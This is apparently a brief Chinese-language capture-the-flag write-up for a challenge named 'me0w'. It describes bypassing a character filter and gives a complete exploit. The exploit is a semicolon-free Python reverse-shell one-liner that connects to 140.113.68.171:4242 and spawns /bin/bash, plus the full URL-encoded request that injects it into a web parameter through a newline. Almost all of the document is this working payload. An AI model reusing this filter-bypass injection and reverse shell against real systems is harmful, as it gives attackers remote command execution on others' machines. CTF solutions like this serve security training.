# me0w
1. 過濾 & ; ` $ | >
2. 沒有 ncat, socat, 也不能用 shell(因為不能 &)
3. 所以用 python 構造出 reverse shell，且不含分號
4. 所以要寫個 inline code

5. payload = [(s.connect(("140.113.68.171", 4242)), os.dup2(s.fileno(),0), os.dup2(s.fileno(),1), os.dup2(s.fileno(),2), pty.spawn("/bin/bash")) if not globals().update(pty = __import__("pty"), os = __import__("os"), s = [socket.socket(socket.AF_INET, socket.SOCK_STREAM) if not globals().update(socket = __import__("socket")) else 1][0]) else 1][0]

6. https://edu-ctf.csie.org:10153/?me0w=%0Apython%20-c%20%27[(s.connect((%22140.113.68.171%22,%204242)),%20os.dup2(s.fileno(),0),%20os.dup2(s.fileno(),1),%20os.dup2(s.fileno(),2),%20pty.spawn(%22/bin/bash%22))%20if%20not%20globals().update(pty%20=%20__import__(%22pty%22),%20os%20=%20__import__(%22os%22),%20s%20=%20[socket.socket(socket.AF_INET,%20socket.SOCK_STREAM)%20if%20not%20globals().update(socket%20=%20__import__(%22socket%22))%20else%201][0])%20else%201][0]%27%20%0A 
